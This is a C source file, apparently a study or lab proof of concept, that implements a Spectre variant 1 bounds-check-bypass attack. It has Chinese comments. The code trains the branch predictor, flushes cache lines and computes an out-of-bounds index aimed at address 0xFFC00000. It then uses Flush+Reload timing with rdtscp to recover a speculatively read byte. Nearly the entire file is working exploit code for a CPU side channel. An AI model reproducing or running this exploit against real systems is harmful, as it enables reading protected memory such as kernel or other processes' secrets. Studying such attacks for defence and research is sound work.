#include <stdio.h>
#include <x86intrin.h>



char buf[257 * 4096];
char array[160] = {255,255,255,255,255};
int array_size = 16;

volatile char value_tmp = 0;

void victim_function(size_t x){
	if(x < array_size)
		value_tmp &= buf[array[x] * 4096];
} 

int main(){
	int tmp;
	int junk = 0;
	int time1 = 0, time2 = 0;
	char test = 100;
	char *addr;
	static int result[257];
	void (*p)(size_t) = victim_function;

	int malicious_x = (char *)0xFFC00000 - array;
	int training_x = 5;
	int j, x;

	// printf("%c\n", array[malicious_x]);
	printf("%d\n", malicious_x);
	scanf("%d", &tmp);

	for(int j = 0; j < 257; j++)
		_mm_clflush(&buf[j * 4096]);

	for (volatile int z = 0; z < 100; z++) {}

	for (j = 29; j >= 0; j--) {
            _mm_clflush(&array_size);  // 清空 array1_size 的缓存
            /*
                100 次内存取值用作延时，确保 cache 页全部换出
            */
            for (volatile int z = 0; z < 100; z++) {}
            /*
                在这一步:
                j % 6 =  0 则 x = 0xFFFF0000
                j % 6 != 0 则 x = 0x00000000
                Avoid jumps in case those tip off the branch predictor
            */
            x = ((j % 6) - 1) & ~0xFFFF;
            /*
                到这里:
                j % 6 =  0 则 x = 0xFFFFFFFF
                j % 6 != 0 则 x = 0x00000000
            */
            x = (x | (x >> 16));
            /*
                最后:
                j % 6 =  0 则 x = malicious_x
                j % 6 != 0 则 x = training_x
            */
            x = training_x ^ (x & (malicious_x ^ training_x));
            /*
                调用触发 cache 代码
                共计触发 5 次，j = 24、18、12、6、0时，都会触发分支预测
            */
            victim_function(x);
        }


	for(int i = 0; i < 257; i ++){
		addr = &buf[i * 4096];
		time1 = __rdtscp(&junk);
		junk = *addr;
		time2 = __rdtscp(&junk) - time1;
		_mm_clflush(&buf[i * 4096]);
		result[i] = time2;
		_mm_clflush(&result[i]);
	}

	for(int i = 0; i < 257; i++){
		if(result[i] < 200)
			printf("the caceh[%d] time was %d\n", i, result[i]);
	}

	// printf("%d\n", buf[255 * 4096]);
	// printf("%d\n", buf[11 * 4096]);
}